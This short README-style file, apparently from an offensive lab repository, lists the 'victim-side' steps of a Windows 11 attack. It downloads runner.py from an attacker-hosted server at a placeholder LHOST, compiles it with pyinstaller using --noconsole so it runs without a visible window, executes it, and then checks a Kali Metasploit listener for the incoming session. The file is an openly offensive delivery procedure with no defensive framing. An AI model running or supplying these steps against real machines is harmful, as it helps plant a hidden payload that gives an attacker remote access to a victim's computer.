# Windows 11 Victim Commands

# TO PROCEED TO THIS STAGE YOU FIRST HAVE TO SUCCESSFULY RUN ALL KALI-ATTACKER SET UP COMMANDS & LISTNER

## 1. Download the runner script from kali hosted http.server or use any other way to get the runner.py to the victim machine
```powershell
wget http://YOUR_LHOST:YOUR_PORT/runner.py -OutFile runner.py
```

## 2. turn the runner.py into an exe
```powershell
pyinstaller --onefile --noconsole runner.py
```

## 3. cd into the new dir created for runner.exe
```powershell
cd dist
```

## 4. run the script
```powershell
.\runner.exe
```
WAIT 30 SECONDS AND CHECK KALI MSF LISTNER.
```